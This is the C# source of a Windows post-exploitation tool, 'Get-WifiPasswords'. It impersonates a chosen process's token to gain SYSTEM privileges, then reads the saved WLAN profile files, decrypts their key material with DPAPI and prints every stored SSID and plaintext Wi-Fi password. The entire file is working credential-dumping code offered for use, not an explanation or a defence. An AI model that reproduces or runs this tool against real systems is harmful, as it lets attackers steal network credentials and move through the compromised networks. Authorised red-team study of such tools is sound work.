using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Get_WifiPasswords
{
    class Program : TokenImpersonation
    {
        static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                Console.WriteLine(@"Usage: .\Get-WifiPasswords.exe PID");
                Environment.Exit(-1);
            }

            int PID;

            if (int.TryParse(args[0], out PID))
            {
                GetSystemToken(PID);
            }
            else
            {
                Console.WriteLine(@"Usage: .\Get-WifiPasswords.exe PID");
                Environment.Exit(-1);
            }

            Console.ForegroundColor = ConsoleColor.White;

        }

        public static void GetProfiles()
        {
            List<string> wifiProfiles = new List<string>();

            string interfacePath = Path.GetPathRoot(Environment.SystemDirectory) + @"ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\";

            string[] adapterGUIDs = Directory.GetDirectories(interfacePath);

            foreach (var guid in adapterGUIDs)
            {
                string[] arr = Directory.GetFiles(guid);
                foreach (string i in arr)
                {
                    wifiProfiles.Add(i);
                }
            }

            foreach (string wifiProfile in wifiProfiles)
            {
                GetContents(wifiProfile);
            }
        }

        public static void GetContents(string wifiProfile)
        {
            XmlDocument xml = new XmlDocument();
            xml.Load(wifiProfile);
            XmlNodeList ssid = xml.GetElementsByTagName("name");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n[+] SSID: {0}", ssid[0].InnerText);

            XmlNodeList keyMaterial = xml.GetElementsByTagName("keyMaterial");
            if (keyMaterial[0].InnerText.Equals(""))
            {
                Console.WriteLine("[!] Password: Not found!");
            }
            else
            {
                Console.WriteLine("[+] Password: {0}\n", Decrypt(keyMaterial[0].InnerText));
            }

        }

        public static string Decrypt(string encPassword)
        {
            byte[] passwordBytes = new byte[encPassword.Length / 2];

            for (int i = 0; i < encPassword.Length; i += 2)
                passwordBytes[i / 2] = Convert.ToByte(encPassword.Substring(i, 2), 16);

            byte[] unprotectedBytes = ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.LocalMachine);

            return Encoding.ASCII.GetString(unprotectedBytes);
        }

        public static void GetSystemToken(int pid)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n[+] Attempting to impersonate token of PID: {0}", pid);

            if (!ImpersonateProcessToken(pid))
            {
                Console.WriteLine("[!] Could not impersonate token! Exiting...");
                Environment.Exit(-1);
            }
            else
            {
                Console.WriteLine("[+] Attempting to enable all privileges...");
                if (!EnablePrivilege("SeIncreaseQuotaPrivilege"))
                {
                    Console.WriteLine("[!] Could not enable all privileges! Exiting...");
                    Environment.Exit(-1);
                }
                else
                {
                    Console.WriteLine("[+] Attempting to dump wifi credentials...");
                    GetProfiles();
                }
            }

        }

    }
}
